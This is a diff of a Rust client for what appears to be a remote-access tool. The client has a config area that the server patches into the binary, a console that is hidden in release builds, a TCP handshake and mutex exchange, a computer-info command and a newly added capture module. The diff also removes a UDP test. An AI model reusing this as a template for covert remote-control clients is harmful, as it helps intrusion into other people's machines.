@@ -1,4 +1,4 @@
-#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 ///////////////////////////////////////////////////////////////////
 // server patches config into this area
 #[used]
@@ -21,12 +21,12 @@ use smol::{
     //Executor,
     io::{AsyncReadExt, AsyncWriteExt},
     net::TcpStream,
-    net::UdpSocket,
 };
 
 use crate::commands::computer_info;
 use crate::threading::ActiveCommands;
 
+mod capture;
 mod commands;
 mod handler;
 mod threading;
@@ -96,27 +96,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
             println!("[v][main] handshake successful; sending mutex");
             stream.write_all(config.mutex.as_slice()).await?;
-
-            // ---- BEGIN UDP TEST ----
-            println!("[*][main] attempting to send UDP packet");
-            let udp_addr = format!("{}:5318", &config.address);
-            match UdpSocket::bind("0.0.0.0:0").await {
-                Ok(socket) => {
-                    if let Err(e) = socket.connect(udp_addr).await {
-                        println!("[x][main] failed to connect UDP socket: {}", e);
-                    } else {
-                        if let Err(e) = socket.send(b"Hello from client!").await {
-                            println!("[x][main] failed to send UDP packet: {}", e);
-                        } else {
-                            println!("[v][main] UDP packet sent successfully");
-                        }
-                    }
-                }
-                Err(e) => {
-                    println!("[x][main] failed to bind UDP socket: {}", e);
-                }
-            }
-            // ---- END UDP TEST ----
         } else {
             println!("[x][main] handshake failed");
             return Err("Failed handshake with server".into()); // drop out
